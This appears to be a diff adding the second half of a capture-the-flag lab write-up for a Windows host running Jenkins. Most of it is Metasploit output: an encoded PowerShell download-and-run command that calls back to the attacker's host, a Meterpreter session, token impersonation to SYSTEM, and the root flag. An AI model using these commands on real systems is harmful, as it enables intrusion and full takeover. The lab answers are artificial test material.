@@ -307,3 +307,313 @@ Exploit target:
    Id  Name
    --  ----
    2   PSH
+```
+```text
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.11.81.220:1234 
+[*] Using URL: http://10.11.81.220:8080/JIKW2V
+[*] Server started.
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABrAFkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAawBZAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAawBZAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4AOAAxAC4AMgAyADAAOgA4ADAAOAAwAC8ASgBJAEsAVwAyAFYALwB0AHUAWQAyAHYAcgBzAGMAMQBCAGYAdAAwAEkAYwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4AOAAxAC4AMgAyADAAOgA4ADAAOAAwAC8ASgBJAEsAVwAyAFYAJwApACkAOwA=
+```
+```text
+msf6 exploit(multi/script/web_delivery) > [*] 10.10.41.147     web_delivery - Delivering AMSI Bypass (1391 bytes)
+[*] 10.10.41.147     web_delivery - Delivering Payload (3523 bytes)
+[*] Sending stage (175686 bytes) to 10.10.41.147
+[*] Meterpreter session 1 opened (10.11.81.220:1234 -> 10.10.41.147:49278) at 2022-09-27 12:24:29 -0400
+```
+```text
+msf6 exploit(multi/script/web_delivery) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information            Connection
+  --  ----  ----                     -----------            ----------
+  1         meterpreter x86/windows  alfred\bruce @ ALFRED  10.11.81.220:1234 -> 10.10.41.147:4927
+                                                            8 (10.10.41.147)
+```
+```text
+msf6 exploit(multi/script/web_delivery) > 
+
+so upload the b64 into jenkins the same before
+
+priv esc
+```
+```text
+msf6 exploit(multi/script/web_delivery) > sessions -i 1
+[*] Starting interaction with 1...
+```
+```text
+meterpreter > shell
+Process 1080 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+
+C:\Program Files (x86)\Jenkins\workspace\project>^Z
+Background channel 1? [y/N]  y
+```
+```text
+meterpreter > load incognito
+Loading extension incognito...Success.
+```
+```text
+meterpreter > list_tokens -g
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+\
+BUILTIN\Administrators
+BUILTIN\IIS_IUSRS
+BUILTIN\Users
+NT AUTHORITY\Authenticated Users
+NT AUTHORITY\NTLM Authentication
+NT AUTHORITY\SERVICE
+NT AUTHORITY\This Organization
+NT AUTHORITY\WRITE RESTRICTED
+NT SERVICE\AppHostSvc
+NT SERVICE\AudioEndpointBuilder
+NT SERVICE\BFE
+NT SERVICE\CertPropSvc
+NT SERVICE\CscService
+NT SERVICE\Dnscache
+NT SERVICE\eventlog
+NT SERVICE\EventSystem
+NT SERVICE\FDResPub
+NT SERVICE\iphlpsvc
+NT SERVICE\LanmanServer
+NT SERVICE\MMCSS
+NT SERVICE\PcaSvc
+NT SERVICE\PlugPlay
+NT SERVICE\RpcEptMapper
+NT SERVICE\Schedule
+NT SERVICE\SENS
+NT SERVICE\SessionEnv
+NT SERVICE\Spooler
+NT SERVICE\TrkWks
+NT SERVICE\TrustedInstaller
+NT SERVICE\UmRdpService
+NT SERVICE\UxSms
+NT SERVICE\Winmgmt
+NT SERVICE\WSearch
+NT SERVICE\wuauserv
+
+Impersonation Tokens Available
+========================================
+NT AUTHORITY\NETWORK
+NT SERVICE\AudioSrv
+NT SERVICE\CryptSvc
+NT SERVICE\DcomLaunch
+NT SERVICE\Dhcp
+NT SERVICE\DPS
+NT SERVICE\LanmanWorkstation
+NT SERVICE\lmhosts
+NT SERVICE\MpsSvc
+NT SERVICE\netprofm
+NT SERVICE\NlaSvc
+NT SERVICE\nsi
+NT SERVICE\PolicyAgent
+NT SERVICE\Power
+NT SERVICE\ShellHWDetection
+NT SERVICE\TermService
+NT SERVICE\W32Time
+NT SERVICE\WdiServiceHost
+NT SERVICE\WinHttpAutoProxySvc
+NT SERVICE\wscsvc
+```
+```text
+meterpreter > impersonate_token "BUILTIN\Administrators"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+```
+```text
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+```text
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name             Arch  Session  User                       Path
+ ---   ----  ----             ----  -------  ----                       ----
+ 0     0     [System Process
+             ]
+ 4     0     System           x64   0
+ 396   4     smss.exe         x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\smss.e
+                                                                        xe
+ 524   516   csrss.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\csrss.
+                                                                        exe
+ 572   564   csrss.exe        x64   1        NT AUTHORITY\SYSTEM        C:\Windows\System32\csrss.
+                                                                        exe
+ 580   516   wininit.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\winini
+                                                                        t.exe
+ 608   564   winlogon.exe     x64   1        NT AUTHORITY\SYSTEM        C:\Windows\System32\winlog
+                                                                        on.exe
+ 668   580   services.exe     x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\servic
+                                                                        es.exe
+ 676   580   lsass.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\lsass.
+                                                                        exe
+ 684   580   lsm.exe          x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\lsm.ex
+                                                                        e
+ 720   1808  cmd.exe          x86   0        alfred\bruce               C:\Windows\SysWOW64\cmd.ex
+                                                                        e
+ 772   668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
+                                                                        t.exe
+ 848   668   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\svchos
+                                             ICE                        t.exe
+ 864   668   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svchos
+                                             E                          t.exe
+ 920   608   LogonUI.exe      x64   1        NT AUTHORITY\SYSTEM        C:\Windows\System32\LogonU
+                                                                        I.exe
+ 936   668   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svchos
+                                             E                          t.exe
+ 988   668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
+                                                                        t.exe
+ 1012  668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
+                                                                        t.exe
+ 1068  668   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\svchos
+                                             ICE                        t.exe
+ 1080  2224  cmd.exe          x86   0        alfred\bruce               C:\Windows\SysWOW64\cmd.ex
+                                                                        e
+ 1212  668   spoolsv.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\spools
+                                                                        v.exe
+ 1240  668   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svchos
+                                             E                          t.exe
+ 1344  668   amazon-ssm-agen  x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\SS
+             t.exe                                                      M\amazon-ssm-agent.exe
+ 1424  668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
+                                                                        t.exe
+ 1452  668   LiteAgent.exe    x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\Xe
+                                                                        ntools\LiteAgent.exe
+ 1480  668   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svchos
+                                             E                          t.exe
+ 1616  668   jenkins.exe      x64   0        alfred\bruce               C:\Program Files (x86)\Jen
+                                                                        kins\jenkins.exe
+ 1732  668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
+                                                                        t.exe
+ 1808  1616  java.exe         x86   0        alfred\bruce               C:\Program Files (x86)\Jen
+                                                                        kins\jre\bin\java.exe
+ 1820  668   Ec2Config.exe    x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\Ec
+                                                                        2ConfigService\Ec2Config.e
+                                                                        xe
+ 1896  524   conhost.exe      x64   0        alfred\bruce               C:\Windows\System32\conhos
+                                                                        t.exe
+ 2036  668   sppsvc.exe       x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\sppsvc
+                                             ICE                        .exe
+ 2060  668   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\svchos
+                                             ICE                        t.exe
+ 2224  720   powershell.exe   x86   0        alfred\bruce               C:\Windows\SysWOW64\Window
+                                                                        sPowerShell\v1.0\powershel
+                                                                        l.exe
+ 2240  524   conhost.exe      x64   0        alfred\bruce               C:\Windows\System32\conhos
+                                                                        t.exe
+ 2312  772   WmiPrvSE.exe     x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\wbem\W
+                                             ICE                        miPrvSE.exe
+ 2732  668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
+                                                                        t.exe
+ 2816  524   conhost.exe      x64   0        alfred\bruce               C:\Windows\System32\conhos
+                                                                        t.exe
+ 2992  668   SearchIndexer.e  x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\Search
+             xe                                                         Indexer.exe
+ 2996  668   TrustedInstalle  x64   0        NT AUTHORITY\SYSTEM        C:\Windows\servicing\Trust
+             r.exe                                                      edInstaller.exe
+
+We want to migrate to a process that is owned by NT AUTHORITY\SYSTEM (e.g. svchost.exe with PID 2732):
+```
+```text
+meterpreter > migrate 2732
+[*] Migrating from 2224 to 2732...
+[*] Migration completed successfully.
+```
+```text
+meterpreter > shell
+Process 1628 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>cd config
+cd config
+
+C:\Windows\System32\config>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E033-3EDD
+
+ Directory of C:\Windows\System32\config
+
+09/27/2022  03:56 PM    <DIR>          .
+09/27/2022  03:56 PM    <DIR>          ..
+10/25/2019  10:46 PM            28,672 BCD-Template
+09/27/2022  04:08 PM        18,087,936 COMPONENTS
+09/27/2022  04:13 PM           262,144 DEFAULT
+07/14/2009  03:34 AM    <DIR>          Journal
+09/27/2022  04:12 PM    <DIR>          RegBack
+10/26/2019  12:36 PM                70 root.txt
+09/27/2022  03:55 PM           262,144 SAM
+09/27/2022  04:07 PM           262,144 SECURITY
+09/27/2022  05:15 PM        38,797,312 SOFTWARE
+09/27/2022  05:27 PM        10,485,760 SYSTEM
+11/21/2010  03:41 AM    <DIR>          systemprofile
+10/25/2019  09:47 PM    <DIR>          TxR
+               8 File(s)     68,186,182 bytes
+               6 Dir(s)  20,426,838,016 bytes free
+
+C:\Windows\System32\config>more root.txt
+more root.txt
+dff0f748678f280250f25a45b8046b4a
+```
+View all the privileges using whoami /priv
+You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.
+To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?
+*NT AUTHORITY\SYSTEM*
+Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
+read the root.txt file at C:\Windows\System32\config
+either do this by dropping into a shell or using a meterpreter command
+*dff0f748678f280250f25a45b8046b4a*
+
+## Notes / Lessons Learned
+[[Res]]
+
